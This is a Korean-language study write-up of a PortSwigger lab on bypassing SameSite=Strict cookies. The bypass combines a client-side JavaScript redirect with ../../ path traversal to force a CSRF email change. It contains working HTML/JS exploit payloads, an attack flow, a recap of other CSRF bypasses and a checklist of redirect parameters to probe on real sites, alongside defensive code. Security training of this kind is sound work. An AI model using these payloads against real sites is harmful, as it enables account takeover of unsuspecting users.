# Lab: SameSite Strict bypass via client-side redirect

## 개요

- **난이도**: Practitioner
- **주제**: Cross-Site Request Forgery (CSRF) — SameSite=Strict 우회 / 클라이언트 사이드 리다이렉트 / 경로 순회
- **링크**: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect

## 목표

세션 쿠키에 `SameSite=Strict` 가 설정되어 외부 사이트에서의 모든 요청에 쿠키가 차단되지만, 애플리케이션 내 클라이언트 사이드 리다이렉트의 경로를 경로 순회(`../../`)로 조작해 같은 사이트 내 요청으로 위장하여 이메일을 변경한다.

## SameSite=Strict 의 동작

```
SameSite=Strict 쿠키 전송 규칙:

차단 (쿠키 미전송):
  외부 사이트 → 모든 요청 (GET, POST, fetch, XHR 전부)
  외부 사이트 링크 클릭 → 대상 사이트 GET 조차도 차단
  ↑ SameSite=Lax 보다 훨씬 강력

허용 (쿠키 전송):
  같은 사이트 내부 → 모든 요청
  같은 사이트 내 리다이렉트 결과 → 허용!
```

## 핵심 — 클라이언트 사이드 리다이렉트의 특성

```
[서버 사이드 리다이렉트 (302)]
  외부 → 취약 사이트 → 302 → 최종 URL
  브라우저: 최종 요청은 여전히 크로스 사이트 네비게이션
  SameSite=Strict: 최종 요청에 쿠키 미전송

[클라이언트 사이드 리다이렉트 (JavaScript)]
  외부 → 취약 사이트 페이지 로드  ← 첫 요청 (크로스 사이트, 쿠키 없음)
           ↓ JS 실행: window.location = '/new-path'
         취약 사이트 /new-path 요청  ← 두 번째 요청 (같은 사이트!)
  SameSite=Strict: 두 번째 요청에 쿠키 전송!
                   ↑ 브라우저 입장에서 이미 같은 사이트에 있음
```

## 취약한 클라이언트 사이드 리다이렉트 코드

```javascript
// 댓글 제출 후 확인 페이지에서 실행되는 JS
// /post/comment/confirmation?postId=5

const postId = new URLSearchParams(location.search).get('postId');
window.location = '/post/' + postId;  // postId 값을 경로에 그대로 삽입!

// 정상 동작:
//   postId=5 → window.location = '/post/5'

// 공격자가 조작:
//   postId=../../my-account/change-email?email=attacker@evil.com
//   → window.location = '/post/../../my-account/change-email?email=...'
//   → 브라우저 정규화: '/my-account/change-email?email=attacker@evil.com'
```

## 공격 흐름

```
1. 공격자: 피해자에게 아래 URL 방문 유도
   https://VULNERABLE.com/post/comment/confirmation?postId=../../my-account/change-email?email=attacker@evil.com

2. 피해자 브라우저:
   GET /post/comment/confirmation?postId=../../my-account/change-email?...
   → 페이지 로드 (외부에서 왔지만 같은 사이트 URL → SameSite 무관)

3. 페이지의 JS 실행:
   window.location = '/post/../../my-account/change-email?email=attacker@evil.com'
   → 브라우저 경로 정규화:
      /post/../../my-account/change-email
      = /my-account/change-email

4. 같은 사이트 내 GET 요청:
   GET /my-account/change-email?email=attacker@evil.com
   Cookie: session=VICTIM_SESSION  ← SameSite=Strict 통과! (같은 사이트)

5. 서버: 이메일 변경 처리 → 피해자 이메일 변경 완료
```

## 경로 순회(`../../`) 동작 원리

```
원래 경로: /post/{postId}
삽입 값:   ../../my-account/change-email

브라우저의 경로 해석:
  /post/ + ../../my-account/change-email
= /post/../.. + /my-account/change-email
         ↑
  ..  = 한 단계 위로  →  /post/../  = /
  ..  = 한 단계 위로  →  /..       = / (루트)
  결과: /my-account/change-email

실제로:
  /post/../../my-account/change-email
  step1: /post/../ → /
  step2: /../ → / (루트는 더 이상 올라갈 수 없음)
  result: /my-account/change-email ✓
```

## exploit 페이로드

```html
<!-- exploit server 에 호스팅 -->
<html>
  <body>
    <script>
      // 방법 1: window.location 으로 직접 이동
      window.location = 'https://VULNERABLE.com/post/comment/confirmation?postId=../../my-account/change-email?email=attacker@evil.com';
    </script>
  </body>
</html>
```

또는 iframe + 자동 실행:

```html
<html>
  <body>
    <script>
      // postId 값에 쿼리스트링이 포함되면 URL 파싱이 복잡할 수 있음
      // encodeURIComponent 또는 & → %26 로 인코딩 필요한 경우도 있음
      const target = 'https://VULNERABLE.com/post/comment/confirmation';
      const payload = '../../my-account/change-email?email=attacker%40evil.com';
      window.location = `${target}?postId=${payload}`;
    </script>
  </body>
</html>
```

## 이전 랩(007)과의 비교

| 항목 | 007 랩 | 008 랩 (이번) |
|------|--------|--------------|
| 우회 대상 | SameSite=Lax | SameSite=Strict |
| 방법 | GET + `_method=POST` | 클라이언트 사이드 리다이렉트 + 경로 순회 |
| 쿠키 전송 조건 | GET 탑레벨 허용 | 같은 사이트 내 리다이렉트 |
| 서버 측 검증 | 메서드 오버라이드 지원 필요 | JS 리다이렉트 경로 파라미터화 필요 |
| 공격 요청 방식 | GET (브라우저가 전송) | JS 리다이렉트로 GET 유발 |

## 핵심 정리

- `SameSite=Strict` 는 외부 사이트에서의 첫 요청을 차단하지만, 같은 사이트 내에서 일어나는 리다이렉트 이후 요청은 허용한다.
- 클라이언트 사이드 JS 리다이렉트는 브라우저 관점에서 "같은 사이트 내 이동"으로 간주된다.
- 리다이렉트 목적지가 URL 파라미터에서 결정된다면, 경로 순회(`../../`)로 임의 경로로 유도할 수 있다.
- **방어**:
  - 리다이렉트 목적지를 사용자 입력으로 결정하지 않음 (허용 목록 방식)
  - `../` 등 경로 순회 시퀀스 필터링
  - 상태 변경 요청에 CSRF 토큰 병행 사용 (SameSite 단독 의존 지양)

## 배운 점 및 추가 학습

### 1. 브라우저의 SameSite 판단 기준

```
"같은 사이트"의 정의:
  eTLD+1 (effective Top-Level Domain + 1) 이 같으면 same-site

예시:
  https://foo.example.com  ↔  https://bar.example.com → same-site (eTLD+1 = example.com)
  https://example.com       ↔  https://example.co.uk  → cross-site (eTLD+1 다름)
  https://example.com       ↔  http://example.com     → same-site (스킴은 무관, Strict도)
  ※ SameSite=Strict의 "Strict"는 서브도메인 간도 같은 사이트로 간주

"같은 출처(origin)" 와의 차이:
  same-origin: scheme + host + port 모두 동일
  same-site:   eTLD+1만 동일하면 됨 (더 느슨한 기준)
```

### 2. 클라이언트 사이드 리다이렉트 vs 서버 사이드 리다이렉트

```
[서버 사이드 302 리다이렉트]
  외부 사이트 → A 요청 (크로스 사이트) → 302 → B 요청
  브라우저 판단: B 요청의 referrer context = 외부 사이트
  SameSite: B 요청도 크로스 사이트로 판단 → 쿠키 미전송

[클라이언트 사이드 JS 리다이렉트]
  외부 사이트 → A 요청 (크로스 사이트, 쿠키 없이)
  → A 페이지 로드 완료 (이미 같은 사이트에 "도착")
  → JS: window.location = '/B'
  브라우저 판단: /B 요청은 현재 페이지(같은 사이트)에서 시작
  SameSite: /B 요청은 같은 사이트 요청 → 쿠키 전송!

핵심: 클라이언트 사이드 리다이렉트는 브라우저가 
      "이미 같은 사이트에 도착한 후 이동"으로 인식
```

### 3. 경로 순회가 통하는 조건

```
취약한 패턴:
  const path = req.query.postId;
  res.redirect('/post/' + path);     // 서버 사이드 (302)
  window.location = '/post/' + path; // 클라이언트 사이드 (JS)

  → path = '../../etc/passwd' 또는 '../../my-account/change-email'

방어 패턴:
  // 1. 숫자만 허용
  const postId = parseInt(req.query.postId);
  if (isNaN(postId)) return res.status(400).send('Invalid');
  window.location = '/post/' + postId;

  // 2. 허용 목록
  const allowed = ['/post/', '/article/', '/blog/'];
  const redirect = req.query.to;
  if (!allowed.some(p => redirect.startsWith(p))) return 400;

  // 3. 상대 경로 정규화 후 검증
  const resolved = path.resolve('/base', userInput);
  if (!resolved.startsWith('/base')) return 400;
```

### 4. SameSite 우회 기법 종합 비교 (001~008)

```
[CSRF 토큰 우회 — 001~006]
  001: 토큰 없음
  002: GET 으로 메서드 변경
  003: 토큰 파라미터 제거
  004: 전역 토큰 풀 (공격자 토큰 재사용)
  005: CRLF로 csrfKey 쿠키 주입
  006: CRLF로 csrf 쿠키 임의값 주입

[SameSite 쿠키 우회 — 007~008]
  007: GET + _method=POST → SameSite=Lax 우회
  008: JS 클라이언트 리다이렉트 + ../../ → SameSite=Strict 우회

공통 패턴:
  SameSite=Lax  → GET 허용 범위 악용 (007)
  SameSite=Strict → "같은 사이트 내 이동"으로 위장 (008)
  → SameSite 만으로는 충분하지 않다 → CSRF 토큰 병행 필수
```

### 5. 실제 환경에서의 클라이언트 사이드 리다이렉트 취약점 탐색

```
탐색 위치:
  - 로그인 후 리다이렉트: ?next=, ?redirect=, ?return_url=
  - 댓글/글 제출 후: ?postId=, ?id=, ?page=
  - 탭/모달 이동: ?tab=, ?section=
  - 오류 페이지 복귀: ?from=, ?back=

테스트 방법:
  1. 파라미터에 ../  또는 ../../ 삽입
  2. 절대 경로 삽입: /my-account
  3. 브라우저 네트워크 탭에서 실제 이동 경로 확인
  4. window.location, location.href, history.pushState 소스 분석
```
